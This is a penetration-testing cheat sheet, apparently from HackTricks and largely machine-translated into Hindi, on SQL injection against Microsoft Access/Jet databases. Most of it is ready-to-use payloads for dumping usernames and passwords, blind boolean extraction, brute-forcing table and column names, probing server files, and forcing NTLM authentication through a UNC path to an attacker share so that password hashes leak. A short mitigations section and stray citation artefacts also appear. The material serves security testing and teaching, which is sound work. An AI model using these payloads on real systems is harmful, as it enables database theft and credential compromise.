# MS Access SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Online Playground

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## DB Limitations

### String Concatenation

स्ट्रिंग संयोजन `& (%26)` और `+ (%2b)` अक्षरों के साथ संभव है।
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### टिप्पणियाँ

MS Access में कोई टिप्पणियाँ नहीं हैं, लेकिन स्पष्ट रूप से एक NULL चर के साथ एक क्वेरी के अंतिम को हटाना संभव है:
```sql
1' union select 1,2 from table%00
```
यदि यह काम नहीं कर रहा है, तो आप हमेशा क्वेरी की सिंटैक्स को ठीक कर सकते हैं:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

वे समर्थित नहीं हैं।

### LIMIT

**`LIMIT`** ऑपरेटर **क्रियान्वित नहीं किया गया है**। हालाँकि, SELECT क्वेरी परिणामों को **पहले N तालिका पंक्तियों तक सीमित करना संभव है `TOP` ऑपरेटर का उपयोग करके**। `TOP` एक पूर्णांक को तर्क के रूप में स्वीकार करता है, जो लौटाई जाने वाली पंक्तियों की संख्या का प्रतिनिधित्व करता है।
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
बस TOP की तरह आप **`LAST`** का उपयोग कर सकते हैं जो **अंत से पंक्तियाँ प्राप्त करेगा**।

## UNION Queries/Sub queries

एक SQLi में आप आमतौर पर किसी न किसी तरह से एक नई क्वेरी निष्पादित करना चाहेंगे ताकि अन्य तालिकाओं से जानकारी निकाली जा सके। MS Access हमेशा यह आवश्यक करता है कि **उपक्वेरियों या अतिरिक्त क्वेरियों में एक `FROM` निर्दिष्ट किया जाए**।\
तो, यदि आप `UNION SELECT` या `UNION ALL SELECT` या एक `SELECT` कोष्ठक में एक शर्त में निष्पादित करना चाहते हैं, तो आपको हमेशा **एक मान्य तालिका नाम के साथ `FROM` निर्दिष्ट करने की आवश्यकता होती है**।\
इसलिए, आपको एक **मान्य तालिका नाम** जानना आवश्यक है।
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

> [!WARNING]
> यह आपको वर्तमान तालिका के मानों को निकालने की अनुमति देगा बिना तालिका के नाम को जाने।

**MS Access** अजीब **सिंटैक्स** की अनुमति देता है जैसे **`'1'=2='3'='asd'=false`**। जैसा कि आमतौर पर SQL इंजेक्शन एक **`WHERE`** क्लॉज के अंदर होगा, हम इसका दुरुपयोग कर सकते हैं।

कल्पना करें कि आपके पास एक MS Access डेटाबेस में SQLi है और आप जानते हैं (या अनुमान लगाते हैं) कि एक **कॉलम का नाम username** है, और यही वह फ़ील्ड है जिसे आप **निकालना** चाहते हैं। आप चेनिंग इक्वल्स तकनीक का उपयोग करते समय वेब ऐप की विभिन्न प्रतिक्रियाओं की जांच कर सकते हैं और संभावित रूप से **`Mid`** फ़ंक्शन का उपयोग करके सबस्ट्रिंग प्राप्त करने के लिए **बूलियन इंजेक्शन** के साथ सामग्री निकाल सकते हैं।
```sql
'=(Mid(username,1,3)='adm')='
```
यदि आप **टेबल का नाम** और **कॉलम** जानते हैं जिसे डंप करना है, तो आप `Mid`, `LAST` और `TOP` के बीच एक संयोजन का उपयोग कर सकते हैं ताकि **सभी जानकारी लीक** की जा सके boolean SQLi के माध्यम से:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_Feel free to check this in the online playground._

### Brute-forcing Tables names

चेनिंग इक्वल्स तकनीक का उपयोग करके आप कुछ इस तरह से **टेबल नामों को ब्रूटफोर्स** कर सकते हैं:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
आप एक अधिक पारंपरिक तरीका भी उपयोग कर सकते हैं:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_इसका ऑनलाइन प्लेग्राउंड में जांचने के लिए स्वतंत्र महसूस करें।_

- Sqlmap सामान्य तालिका नाम: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html) में एक और सूची है

### कॉलम नामों का ब्रूट-फोर्सिंग

आप **चेनिंग बराबर ट्रिक** के साथ वर्तमान कॉलम नामों को **ब्रूट-फोर्स** कर सकते हैं:
```sql
'=column_name='
```
या **group by** के साथ:
```sql
-1' GROUP BY column_name%00
```
या आप **अलग तालिका** के कॉलम नामों को ब्रूट-फोर्स कर सकते हैं:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### Dumping data

हम पहले ही [**चेनिंग इक्वल्स तकनीक**](ms-access-sql-injection.md#chaining-equals-+-substring) **का उपयोग करके वर्तमान और अन्य तालिकाओं से डेटा निकालने** पर चर्चा कर चुके हैं। लेकिन अन्य तरीके भी हैं:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
संक्षेप में, क्वेरी एक "if-then" कथन का उपयोग करती है ताकि सफलता की स्थिति में "200 OK" या अन्यथा "500 Internal Error" को ट्रिगर किया जा सके। TOP 10 ऑपरेटर का लाभ उठाते हुए, पहले दस परिणामों का चयन करना संभव है। LAST का बाद का उपयोग केवल 10वें ट्यूपल पर विचार करने की अनुमति देता है। ऐसे मान पर, MID ऑपरेटर का उपयोग करके, एक साधारण वर्ण तुलना करना संभव है। MID और TOP के इंडेक्स को सही ढंग से बदलकर, हम "username" फ़ील्ड की सामग्री को सभी पंक्तियों के लिए डंप कर सकते हैं।

### Time-Based (Blind) Tricks

Jet/ACE SQL स्वयं एक मूल `SLEEP()` या `WAITFOR` फ़ंक्शन को **नहीं** उजागर करता है, इसलिए पारंपरिक समय-आधारित ब्लाइंड इंजेक्शन सीमित हैं। हालाँकि, आप अभी भी एक मापनीय देरी पेश कर सकते हैं, जिससे इंजन को **एक नेटवर्क संसाधन तक पहुँचने के लिए मजबूर किया जाता है जो धीमा है या उत्तर नहीं देता**। क्योंकि इंजन परिणाम लौटाने से पहले फ़ाइल खोलने की कोशिश करेगा, HTTP प्रतिक्रिया समय हमलावर-नियंत्रित होस्ट तक राउंड-ट्रिप विलंबता को दर्शाता है।
```sql
' UNION SELECT 1 FROM SomeTable IN '\\10.10.14.3\doesnotexist\dummy.mdb'--
```
UNC पथ को इंगित करें:

* एक उच्च-लेटेंसी लिंक के पीछे SMB शेयर
* एक होस्ट जो `SYN-ACK` के बाद TCP हैंडशेक को गिराता है
* एक फ़ायरवॉल सिंकहोल

दूरस्थ लुकअप द्वारा पेश किए गए अतिरिक्त सेकंड को **आउट-ऑफ-बैंड टाइमिंग ओरेकल** के रूप में उपयोग किया जा सकता है बूलियन स्थितियों के लिए (जैसे, केवल तब धीमा पथ चुनें जब इंजेक्ट किया गया प्रीडिकेट सत्य हो)। Microsoft दूरस्थ डेटाबेस व्यवहार और संबंधित रजिस्ट्री किल-स्विच को KB5002984 में दस्तावेज करता है। citeturn1search0

### अन्य दिलचस्प कार्य

- `Mid('admin',1,1)` स्थिति 1 से लंबाई 1 का उपस्ट्रिंग प्राप्त करें (प्रारंभिक स्थिति 1 है)
- `LEN('1234')` स्ट्रिंग की लंबाई प्राप्त करें
- `ASC('A')` वर्ण का ASCII मान प्राप्त करें
- `CHR(65)` ASCII मान से स्ट्रिंग प्राप्त करें
- `IIF(1=1,'a','b')` यदि तो
- `COUNT(*)` आइटम की संख्या गिनें

## तालिकाओं की गणना करना

[**यहां**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) आप तालिका नाम प्राप्त करने के लिए एक क्वेरी देख सकते हैं:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
हालांकि, ध्यान दें कि SQL इंजेक्शन पाना बहुत सामान्य है जहाँ आपके पास **`MSysObjects`` तालिका को पढ़ने का एक्सेस नहीं है**।

## फ़ाइल सिस्टम एक्सेस

### वेब रूट डायरेक्टरी का पूर्ण पथ

**वेब रूट का पूर्ण पथ जानने से आगे के हमलों में मदद मिल सकती है**। यदि एप्लिकेशन की त्रुटियाँ पूरी तरह से छिपी नहीं हैं, तो एक गैर-मौजूद डेटाबेस से डेटा चुनने की कोशिश करते समय डायरेक्टरी पथ का पता लगाया जा सकता है।

`http://localhost/script.asp?id=1'+ '+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access एक **त्रुटि संदेश के साथ प्रतिक्रिया करता है जिसमें वेब डायरेक्टरी का पूर्ण पथ होता है**।

### फ़ाइल सूचीकरण

निम्नलिखित हमलावर वेक्टर का उपयोग **दूरस्थ फ़ाइल सिस्टम पर एक फ़ाइल के अस्तित्व का अनुमान लगाने के लिए किया जा सकता है**। यदि निर्दिष्ट फ़ाइल मौजूद है, तो MS Access एक त्रुटि संदेश उत्पन्न करता है जो सूचित करता है कि डेटाबेस प्रारूप अमान्य है:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

फ़ाइलों को सूचीबद्ध करने का एक और तरीका **एक डेटाबेस.तालिका आइटम को निर्दिष्ट करना** है। **यदि** निर्दिष्ट **फ़ाइल मौजूद है**, तो MS Access एक **डेटाबेस प्रारूप त्रुटि संदेश** प्रदर्शित करता है।

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb फ़ाइल नाम अनुमान लगाना

**डेटाबेस फ़ाइल नाम (.mdb)** को निम्नलिखित क्वेरी के साथ अनुमान लगाया जा सकता है:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

जहाँ **name[i] एक .mdb फ़ाइल नाम है** और **realTable डेटाबेस के भीतर एक मौजूदा तालिका है**। हालांकि MS Access हमेशा एक त्रुटि संदेश उत्पन्न करेगा, लेकिन अमान्य फ़ाइल नाम और मान्य .mdb फ़ाइल नाम के बीच अंतर करना संभव है।

### दूरस्थ डेटाबेस एक्सेस और NTLM क्रेडेंशियल चोरी (2023)

चूंकि Jet 4.0 हर क्वेरी एक *विभिन्न* `.mdb/.accdb` फ़ाइल में स्थित तालिका को संदर्भित कर सकती है `IN '<path>'` क्लॉज के माध्यम से:
```sql
SELECT first_name FROM Employees IN '\\server\share\hr.accdb';
```
यदि उपयोगकर्ता इनपुट को **IN** के बाद के भाग में (या `JOIN … IN` / `OPENROWSET` / `OPENDATASOURCE` कॉल में) जोड़ा जाता है, तो एक हमलावर एक **UNC पथ** निर्दिष्ट कर सकता है जो एक होस्ट की ओर इशारा करता है जिसे वे नियंत्रित करते हैं। इंजन:

1. दूरस्थ डेटाबेस को खोलने के लिए SMB / HTTP के माध्यम से प्रमाणीकरण करने की कोशिश करेगा;
2. वेब-सर्वर के **NTLM क्रेडेंशियल्स** को लीक करेगा (बाध्य प्रमाणीकरण);
3. दूरस्थ फ़ाइल को पार्स करेगा - एक गलत या दुर्भावनापूर्ण डेटाबेस Jet/ACE मेमोरी-करप्शन बग को ट्रिगर कर सकता है जो कई बार पैच किए गए हैं (जैसे CVE-2021-28455)।

व्यावहारिक इंजेक्शन उदाहरण:
```sql
1' UNION SELECT TOP 1 name
FROM MSysObjects
IN '\\attacker\share\poc.mdb'-- -
```
Impact:

* Net-NTLMv2 हैश का आउट-ऑफ-बैंड एक्सफिल्ट्रेशन (जो रिले या ऑफलाइन क्रैकिंग के लिए उपयोगी है)।
* यदि एक नया Jet/ACE पार्सर बग का शोषण किया जाता है तो संभावित रिमोट कोड निष्पादन।

Mitigations (विरासत Classic ASP ऐप्स के लिए भी अनुशंसित):

* `HKLM\Software\Microsoft\Jet\4.0\Engines` के तहत `AllowQueryRemoteTables = 0` रजिस्ट्री मान जोड़ें (और समकक्ष ACE पथ के तहत)। यह Jet/ACE को `\\` से शुरू होने वाले रिमोट पथों को अस्वीकार करने के लिए मजबूर करता है।
* नेटवर्क सीमा पर आउटबाउंड SMB/WebDAV को ब्लॉक करें।
* किसी भी क्वेरी के उस भाग को साफ करें / पैरामीटर करें जो `IN` क्लॉज के अंदर समाप्त हो सकता है।

फोर्स्ड-ऑथेंटिकेशन वेक्टर को Check Point Research द्वारा 2023 में फिर से देखा गया, यह साबित करते हुए कि यह पूरी तरह से पैच किए गए Windows Server पर शोषण योग्य है जब रजिस्ट्री कुंजी अनुपस्थित है। citeturn0search0

### .mdb पासवर्ड क्रैकर

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) एक मुफ्त उपयोगिता है जिसका उपयोग Microsoft Access 95/97/2000/XP या Jet Database Engine 3.0/4.0 का मुख्य डेटाबेस पासवर्ड पुनर्प्राप्त करने के लिए किया जा सकता है।

## References

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
- [Microsoft KB5002984 – Jet/ACE को रिमोट टेबल्स को ब्लॉक करने के लिए कॉन्फ़िगर करना](https://support.microsoft.com/en-gb/topic/kb5002984-configuring-jet-red-database-engine-and-access-connectivity-engine-to-block-access-to-remote-databases-56406821-30f3-475c-a492-208b9bd30544)
- [Check Point Research – NTLM फोर्स्ड ऑथेंटिकेशन के लिए Microsoft Access लिंक्ड टेबल्स का दुरुपयोग (2023)](https://research.checkpoint.com/2023/abusing-microsoft-access-linked-table-feature-to-perform-ntlm-forced-authentication-attacks/)

{{#include ../../banners/hacktricks-training.md}}
